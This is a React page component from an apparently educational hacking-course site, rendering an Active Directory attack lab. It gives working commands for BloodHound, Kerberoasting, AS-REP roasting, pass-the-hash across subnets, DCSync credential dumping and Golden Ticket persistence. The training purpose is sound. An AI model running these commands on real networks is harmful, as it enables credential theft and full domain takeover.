'use client'
import React from 'react'
import Link from 'next/link'

const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: '#ff4136', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.3)', padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
    {children}
  </h2>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050000', border: '1px solid #2e0000', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#ff6b6b', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const Alert = ({ type, children }: { type: 'objective' | 'warn' | 'tip'; children: React.ReactNode }) => {
  const c: Record<string, [string, string, string]> = {
    objective: ['#ff4136', 'rgba(255,65,54,0.05)', 'OBJECTIVE'],
    warn:      ['#ffb347', 'rgba(255,179,71,0.05)', 'IMPORTANT'],
    tip:       ['#00ff41', 'rgba(0,255,65,0.04)',   'PRO TIP'],
  }
  const [color, bg, label] = c[type]
  return (
    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}

export default function ADLab() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/active-directory" style={{ color: '#5a7a5a', textDecoration: 'none' }}>ACTIVE DIRECTORY</Link>
        <span>›</span>
        <span style={{ color: '#ff4136' }}>LAB</span>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ACTIVE DIRECTORY · LAB</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: '#ff4136', margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,65,54,0.3)' }}>AD ATTACK LAB</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>Hands-on: BloodHound · Kerberoasting · AS-REP Roasting · DCSync · Pass-the-Hash</p>
      </div>

      <div style={{ background: '#0a0000', border: '1px solid #2e0000', borderRadius: '6px', padding: '1.25rem', marginBottom: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>LAB ENVIRONMENT — RECOMMENDED</div>
        {['TryHackMe: "Active Directory Basics" + "Attacking Kerberos" rooms (free)', 'HackTheBox: Forest, Sauna, Active, Resolute machines (AD-focused)', 'VulnLab — dedicated AD lab environments', 'GOAD (Game of Active Directory) — local multi-DC lab: github.com/Orange-Cyberdefense/GOAD', 'TCM Security — Practical Active Directory course (best paid option)'].map((item, i) => (
          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', padding: '4px 0', display: 'flex', gap: '8px' }}>
            <span style={{ color: '#3a0000' }}>›</span><span>{item}</span>
          </div>
        ))}
      </div>

      <Alert type="warn">These labs require an Active Directory environment. Use TryHackMe/HackTheBox VPN rooms, or set up GOAD locally. Never run these against real corporate environments without written authorisation.</Alert>

      <H2 num="01">BloodHound Enumeration</H2>
      <Alert type="objective">Set up BloodHound, collect domain data with SharpHound/bloodhound-python, and identify attack paths to Domain Admin.</Alert>

      <Pre label="// SETUP & COLLECT">{`# Install:
sudo apt install bloodhound neo4j

# Start Neo4j:
sudo neo4j start
# Browse: http://localhost:7474 → change default password

# Start BloodHound:
bloodhound

# Collect data (requires valid domain credentials):
pip install bloodhound
bloodhound-python -u validuser -p password -d domain.local -ns DC_IP -c All
# Creates JSON files → drag into BloodHound

# TryHackMe method: run SharpHound.exe on Windows target
# then download ZIP and import`}</Pre>

      <Pre label="// KEY QUERIES TO RUN">{`# In BloodHound:
# 1. Find all Domain Admins → see their sessions
# 2. Shortest Paths to Domain Admins → automated attack path
# 3. Find Kerberoastable Users → click each → see password strength hints
# 4. Find AS-REP Roastable Users
# 5. Map your owned user → right-click → Mark as Owned → Shortest Path to DA`}</Pre>

      <H2 num="02">Kerberoasting</H2>
      <Alert type="objective">Find SPNs in the domain, request TGS tickets, and crack the hashes offline to reveal service account passwords.</Alert>

      <Pre label="// KERBEROASTING FULL CHAIN">{`# From Kali with creds:
python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request

# Save output to file:
python3 GetUserSPNs.py domain.local/user:password -dc-ip DC_IP \
  -request -outputfile kerberoast.txt

# Crack:
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Check results:
hashcat -m 13100 kerberoast.txt --show

# TryHackMe "Attacking Kerberos" room walks through this exactly
# Expected: svc_sql or similar service account with weak password`}</Pre>

      <H2 num="03">AS-REP Roasting</H2>
      <Alert type="objective">Find users without Kerberos pre-authentication, harvest AS-REP hashes, and crack them offline.</Alert>

      <Pre label="// AS-REP ROASTING">{`# Enumerate candidates:
python3 GetNPUsers.py domain.local/ -usersfile /usr/share/seclists/Usernames/Names/names.txt \
  -no-pass -format hashcat -dc-ip DC_IP 2>/dev/null | grep -v Errno

# With credentials (enumerate from AD directly):
python3 GetNPUsers.py domain.local/user:password -request -format hashcat -dc-ip DC_IP

# Crack AS-REP hashes:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Practice: HTB machine "Forest" is perfect for this
# The svc-alfresco account has no preauth required`}</Pre>

      <H2 num="04">Pass-the-Hash + Lateral Movement</H2>
      <Alert type="objective">Use a captured NTLM hash to authenticate without knowing the password. Move laterally across the network.</Alert>

      <Pre label="// PTH ACROSS THE NETWORK">{`# Spray hash against entire subnet:
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth

# Check which hosts you can reach:
cme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth | grep "+"

# Execute command on reachable hosts:
cme smb 192.168.1.100 -u Administrator -H NTLM_HASH --local-auth -x "whoami /all"

# Get interactive shell:
python3 psexec.py -hashes :NTLM_HASH ./Administrator@192.168.1.100

# Dump more hashes from reached host:
python3 secretsdump.py -hashes :NTLM_HASH ./Administrator@192.168.1.100`}</Pre>

      <H2 num="05">DCSync — Own the Domain</H2>
      <Alert type="objective">Use DCSync to dump all domain password hashes including krbtgt. Crack Administrator hash. Demonstrate complete domain compromise.</Alert>

      <Pre label="// DCSYNC FROM KALI">{`# Requires: Domain Admin level access (from prev step)

# Dump everything:
python3 secretsdump.py domain.local/admin:password@DC_IP

# Dump specific user:
python3 secretsdump.py domain.local/admin:password@DC_IP \
  -just-dc-user Administrator

# Dump krbtgt (for Golden Ticket):
python3 secretsdump.py domain.local/admin:password@DC_IP \
  -just-dc-user krbtgt

# Pass krbtgt hash directly to next hosts:
cme smb 192.168.1.0/24 -u Administrator -H ADMIN_NTLM_HASH`}</Pre>

      <Pre label="// CREATE GOLDEN TICKET FOR PERSISTENCE">{`# After getting krbtgt hash:
python3 ticketer.py \
  -nthash KRBTGT_NTLM_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain domain.local \
  Administrator

# Use the ticket:
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local

# You now have persistent Domain Admin access
# even if the real Administrator password changes`}</Pre>

      <div style={{ marginTop: '3rem', background: '#0a0000', border: '1px solid rgba(255,65,54,0.2)', borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#cc2200', letterSpacing: '0.2em', marginBottom: '1rem' }}>SELF ASSESSMENT</div>
        {['What is the difference between Kerberoasting and AS-REP Roasting?', 'Why does DCSync not require physical access to the DC?', 'What rights are needed to perform DCSync?', 'How does a Golden Ticket differ from a Silver Ticket?', 'Why is SMB signing disabled by default on workstations but not DCs?', 'What does BloodHound show that manual enumeration misses?', 'Complete HTB Forest machine — document every step'].map((q, i) => (
          <div key={i} style={{ display: 'flex', gap: '10px', padding: '8px 0', borderBottom: '1px solid #0a0000', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
            <span style={{ color: '#ff4136', flexShrink: 0 }}>{String(i + 1).padStart(2, '0')}.</span>
            <span style={{ color: '#5a7a5a' }}>{q}</span>
          </div>
        ))}
      </div>

      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #2e0000', display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← CONCEPT</Link>
        <Link href="/modules/web-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#ff4136', padding: '8px 20px', border: '1px solid rgba(255,65,54,0.4)', borderRadius: '4px', background: 'rgba(255,65,54,0.06)' }}>
          NEXT: WEB ATTACKS →
        </Link>
      </div>
    </div>
  )
}
